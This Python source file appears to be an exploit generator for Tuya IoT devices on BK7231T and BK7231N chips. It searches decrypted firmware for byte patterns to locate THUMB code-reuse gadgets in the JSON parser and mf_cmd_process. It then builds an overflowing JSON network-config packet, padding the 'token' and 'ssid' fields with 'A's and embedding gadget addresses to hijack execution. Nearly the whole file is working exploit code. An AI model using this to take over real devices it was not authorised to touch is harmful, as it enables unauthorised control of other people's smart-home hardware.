import bisect
import itertools
import struct
import sys
import base64
import json
import zlib
import os.path

from collections import deque, namedtuple
from typing import Callable, List

from capstone import *

CodePatternMatch = namedtuple("CodePatternMatch", "matched_instructions start_address start_offset")
SentinelInstruction = namedtuple("SentinelInstruction", "address size")

class ProfileBuilder(object):
    MAX_CONFIG_PACKET_PAYLOAD_LEN = 0xE8
    AUTHKEY_TEMPLATE = 'AUTHKEYAAAAAAAAA'
    UUID_TEMPLATE = 'UUIDAAAAAAAA'
    
    def build_network_config_packet(self, payload):
        if len(payload) > self.MAX_CONFIG_PACKET_PAYLOAD_LEN:
            raise ValueError('Payload is too long!')
        # NOTE
        # fr_num and crc do not seem to be used in the disas
        # calculating them anyway - in case it's needed
        # for some reason.
        tail_len = 8
        head, tail = 0x55aa, 0xaa55
        fr_num, fr_type = 0, 0x1
        plen = len(payload) + tail_len
        buffer = struct.pack("!IIII", head, fr_num, fr_type, plen)
        buffer += payload
        crc = zlib.crc32(buffer)
        buffer += struct.pack("!II", crc, tail)
        return buffer

    def encode_json_val(self, value):
        encoded = []
        escaped = list(map(ord, '"\\'))
        escape_char = ord('\\')
        for i in value:
            if i in escaped:
                encoded.append(escape_char)
            encoded.append(i)
        return bytes(encoded)

    def check_valid_payload(self, value):
        eq_zero = lambda x: x == 0
        if any(map(eq_zero, value)):
            raise RuntimeError('[!] At least one null byte detected in payload. Clobbering will stop before that.')
        return value

class CodePatternFinder(object):
    def __init__(self, code: bytes, base_address: int = 0):
        self.code = code
        self.base_address = base_address
        self.thumb_cache = self.__build_cache(thumb_mode=True)
        self.arm_cache = self.__build_cache(thumb_mode=False)

    def search(self, condition_lambdas: List[Callable[[CsInsn, int], bool]], start_address: int = None, thumb_mode: bool = True, stop_at_first: bool = True, after_match_count: int = None) -> List[CodePatternMatch]:
        cache = self.thumb_cache if thumb_mode else self.arm_cache
        wordsize = self.__get_wordsize(thumb_mode)

        if start_address is None:
            start_address = self.base_address

        if start_address < self.base_address:
            raise ValueError(f"Starting address 0x{start_address:X} cannot be less than base address 0x{self.base_address:X}")

        if start_address > self.base_address + len(self.code):
            raise ValueError(f"Starting address 0x{start_address:X} is higher the end of code address")

        if (start_address % wordsize) != 0:
            raise ValueError(f"Start address must be aligned to word size {wordsize}")

        bisect_cache = list(i.address for i in cache)
        start_offset = bisect.bisect(bisect_cache, start_address)
        workinglist = deque(cache[start_offset:])

        matches = []
        while workinglist:
            invocation_list = list(itertools.islice(workinglist, 0, len(condition_lambdas)))
            invocations = [not isinstance(i, SentinelInstruction) and l(i, i.address - self.base_address) for i, l in zip(invocation_list, condition_lambdas)]
            if all(invocations):
                matched_address = invocation_list[0].address
                matched_offset = matched_address - self.base_address
                matched_instructions = invocation_list if after_match_count is None else list(itertools.islice(workinglist, 0, len(condition_lambdas) + after_match_count))
                match = CodePatternMatch(matched_instructions=matched_instructions, start_address=matched_address, start_offset=matched_offset)
                if stop_at_first:
                    return [match]
                else:
                    matches.append(match)

            workinglist.popleft()
        
        return matches

    def bytecode_search(self, bytecode: bytes, stop_at_first: bool = True):
        offset = self.code.find(bytecode, 0)

        if offset == -1:
            return []

        matches = [self.base_address + offset]
        if stop_at_first:
            return matches

        offset = self.code.find(bytecode, offset+1)
        while offset != -1:
            matches.append(self.base_address + offset)
            offset = self.code.find(bytecode, offset+1)

        return matches

    def set_final_thumb_offset(self, address):
        # Because we're only scanning the app partition, we must add the offset for the bootloader
        # Also add an offset of 1 for the THUMB
        return address + 0x10000 + 1

    def __build_cache(self, thumb_mode: bool):
        mode = CS_MODE_THUMB if thumb_mode else CS_MODE_ARM
        md = Cs(CS_ARCH_ARM, mode)
        md.detail = True
        wordsize = self.__get_wordsize(thumb_mode)

        cache = []
        offset = 0
        sentinel_size = 0
        while offset < len(self.code):
            address = offset + self.base_address
            instrs = list(md.disasm(self.code[offset:], offset=address))
            increment = sum((i.size for i in instrs)) or wordsize
            if instrs:
                cache.extend(instrs)
                if sentinel_size:
                    cache.append(SentinelInstruction(address=(address-sentinel_size), size=sentinel_size))
                    sentinel_size = 0
            else:
                sentinel_size += wordsize
            offset += increment

        return cache

    def __get_wordsize(self, thumb_mode: bool):
        return 2 if thumb_mode else 4

def name_output_file(desired_appended_name):
    # File generated by bk7321tools dissect_dump
    if appcode_path.endswith('app_1.00_decrypted.bin'):
        return appcode_path.replace('app_1.00_decrypted.bin', desired_appended_name)
    return appcode_path + "_" + desired_appended_name

def walk_app_code():
    # Older versions of BK7231T, BS version 30.0x, SDK 2.0.0
    if b'TUYA IOT SDK V:2.0.0' in appcode and b'AT 8710_2M' in appcode:
        # 2b 68 30 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
        # 1 match should be found
        # 04 1e 07 d1 11 9b 21 1c 00 is the byte pattern for mf_cmd_process execution
        # 3 matches, 2nd is correct
        process_generic("BK7231T", 1, "datagram", "2b68301c9847", 1, 0, "041e07d1119b211c00", 3, 1)
        return

    # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
    if b'TUYA IOT SDK V:1.0.' in appcode and b'AT bk7231t' in appcode:
        # 23 68 38 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
        # 2 matches should be found, 1st is correct
        # a1 4f 06 1e is the byte pattern for mf_cmd_process execution
        # 1 match should be found
        process_generic("BK7231T", 2, "datagram", "2368381c9847", 2, 0, "a14f061e", 1, 0)
        return

    # Newest versions of BK7231T, BS 40.00, SDK 2.3.2
    if b'TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
        # TODO: Figure out how to process this format
        raise RuntimeError("This device uses SDK 2.3.2 and there is currently no pattern to mach it.")
        #process_generic("BK7231T", 3, "datagram/ssid", "", 0, 0, "", 0, 0) # Uknown if payload_version is 1 or 2, more likely 2
        return

    # BK7231N, BS 40.00, SDK 2.3.1
    # 0.0.2 is also a variant of 2.3.1
    if (b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
        or b'TUYA IOT SDK V:0.0.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode):
        # 43 68 20 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
        # 1 match should be found
        # 05 1e 00 d1 15 e7 is the byte pattern for mf_cmd_process execution
        # 1 match should be found
        process_generic("BK7231N", 1, "ssid", "4368201c9847", 1, 0, "051e00d115e7", 1, 0)
        return

    # BK7231N, BS 40.00, SDK 2.3.3
    if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.5_CD:1.0.0' in appcode:
        # 43 68 20 1c 98 47 is the byte pattern for intermediate addess entry (usually ty_cJSON_Parse)
        # 1 match should be found
        # 05 1e 00 d1 fc e6 is the byte pattern for mf_cmd_process execution
        # 1 match should be found
        process_generic("BK7231N", 2, "ssid", "4368201c9847", 1, 0, "051e00d1fce6", 1, 0)
        return

    raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')

def process_generic(chipset, pattern_version, payload_version, intermediate_string, intermediate_count, intermediate_index, mf_cmd_process_string, mf_cmd_process_count, mf_cmd_process_index):
    print(f"[!] Matched pattern for {chipset} version {pattern_version}, payload version {payload_version}")
    print("[!] Searching for intermediate address")
    matcher = CodePatternFinder(appcode, 0x0)

    intermediate_bytecode = bytes.fromhex(intermediate_string)
    intermediate_matches = matcher.bytecode_search(intermediate_bytecode, stop_at_first=False)
    
    if not intermediate_matches or len(intermediate_matches) > intermediate_count:
        raise RuntimeError("Failed to find intermediate address")
    
    intermediate_addr = matcher.set_final_thumb_offset(intermediate_matches[intermediate_index])

    for b in intermediate_addr.to_bytes(3, byteorder='little'):
        if b == 0 and intermediate_count > 1:
            print("[!] Preferred intermediate address contained a null byte, using available alternative")
            intermediate_addr = matcher.set_final_thumb_offset(intermediate_matches[intermediate_index + 1])

    print(f"[+] Payload intermediate gadget (THUMB): 0x{intermediate_addr:X}")
    print("[!] Searching for mf_cmd_process")    

    mf_cmd_process_code = bytes.fromhex(mf_cmd_process_string)
    mf_cmd_process_matches = matcher.bytecode_search(mf_cmd_process_code, stop_at_first=False)
    
    if not mf_cmd_process_matches or len(mf_cmd_process_matches) != mf_cmd_process_count:
        raise RuntimeError(f"Failed to find mf_cmd_process (found {len(mf_cmd_process_matches)}, expected {mf_cmd_process_count})")

    mf_cmd_process_addr = matcher.set_final_thumb_offset(mf_cmd_process_matches[mf_cmd_process_index])
    print(f"[+] Payload pwn gadget (THUMB): 0x{mf_cmd_process_addr:X}")
    
    if payload_version == "datagram":
        make_profile_datagram(chipset, intermediate_addr, mf_cmd_process_addr)
        return
    elif payload_version == "ssid":
        make_profile_ssid(chipset, intermediate_addr, mf_cmd_process_addr)
        return
        
    raise RuntimeError("Unknown chipset, unable to generate profile, please open a new issue and include the bin.")

# Used by nearly all BK7231T devices
def make_profile_datagram(chipset, intermediate_addr, mf_cmd_process_addr):
    profile_builder = ProfileBuilder()
    prep_gadget = intermediate_addr.to_bytes(3, byteorder="little")
    pwn_gadget = mf_cmd_process_addr.to_bytes(4, byteorder="little")

    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"A","token":"' + b'A' * 72 + prep_gadget + b'"}'
    payload = profile_builder.check_valid_payload(payload)

    datagram = profile_builder.build_network_config_packet(payload=payload)
    datagram_padding = b'A' * (4 - (len(datagram) % 4))
    datagram_padding += pwn_gadget * ((256-len(datagram+datagram_padding))//4)

    data = {
        'chip': f'{chipset}',
        'payload': base64.b64encode(payload).decode('utf-8'),
        'authkey_template': f'{profile_builder.AUTHKEY_TEMPLATE}',
        'uuid_template': f'{profile_builder.UUID_TEMPLATE}',
        'datagram_padding': base64.b64encode(datagram_padding).decode('utf-8')
    }

    with open(name_output_file('address_finish.txt'), 'w') as f:
        f.write(f'0x{intermediate_addr:X}')
    with open(name_output_file('address_datagram.txt'), 'w') as f:
        f.write(f'0x{mf_cmd_process_addr:X}')
    with open(name_output_file('chip.txt'), 'w') as f:
        f.write(f'{chipset}')
    
# Used by nearly all BK7231N devices
def make_profile_ssid(chipset, intermediate_addr, mf_cmd_process_addr):
    profile_builder = ProfileBuilder()
    prep_gadget = intermediate_addr.to_bytes(3, byteorder="little")
    pwn_gadget = mf_cmd_process_addr.to_bytes(3, byteorder="little")
    payload = b'{"auzkey":"' + profile_builder.AUTHKEY_TEMPLATE.encode('utf-8') + b'","uuid":"' + profile_builder.UUID_TEMPLATE.encode('utf-8') + b'","pskKey":"","prod_test":false,"ap_ssid":"A","ssid":"AAAA' + pwn_gadget + b'","token":"' + b'A' * 72 + prep_gadget + b'"}'
    payload = profile_builder.check_valid_payload(payload)

    datagram = profile_builder.build_network_config_packet(payload=payload)
    datagram_padding = b'A' * (256-len(datagram))

    data = {
        'chip': f'{chipset}',
        'payload': base64.b64encode(payload).decode('utf-8'),
        'authkey_template': f'{profile_builder.AUTHKEY_TEMPLATE}',
        'uuid_template': f'{profile_builder.UUID_TEMPLATE}',
        'datagram_padding': base64.b64encode(datagram_padding).decode('utf-8')
    }

    with open(name_output_file('address_finish.txt'), 'w') as f:
        f.write(f'0x{intermediate_addr:X}')
    with open(name_output_file('address_ssid.txt'), 'w') as f:
        f.write(f'0x{mf_cmd_process_addr:X}')
    with open(name_output_file('chip.txt'), 'w') as f:
        f.write(f'{chipset}')

def run(decrypted_app_file: str):
    if not decrypted_app_file:
        print('Usage: python haxomatic.py <app code file>')
        sys.exit(1)

    address_finish_file = decrypted_app_file.replace('_app_1.00_decrypted.bin', '_address_finish.txt')
    if os.path.exists(address_finish_file):
        print('[+] Haxomatic has already been run')
        return

    global appcode_path, appcode
    appcode_path = decrypted_app_file
    with open(appcode_path, 'rb') as fs:
        appcode = fs.read()
        walk_app_code()

if __name__ == '__main__':
    run(sys.argv[1])
